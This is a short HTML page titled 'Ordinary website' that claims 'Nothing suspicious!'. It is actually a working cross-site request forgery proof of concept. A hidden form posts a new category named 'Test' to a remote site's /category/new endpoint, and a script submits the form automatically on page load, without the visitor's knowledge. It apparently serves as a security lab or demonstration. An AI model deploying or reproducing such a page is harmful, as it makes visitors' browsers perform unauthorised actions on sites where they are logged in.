<html>
<body>
<h2>Ordinary website</h2>

<p>Nothing suspicious!</p>

<form name="CSRF" action="http://piotrek123.16mb.com/category/new" method="post">
    <input type="hidden" name="name" value="Test">
</form>

<script>
    document.CSRF.submit();
</script>
</body>
</html>
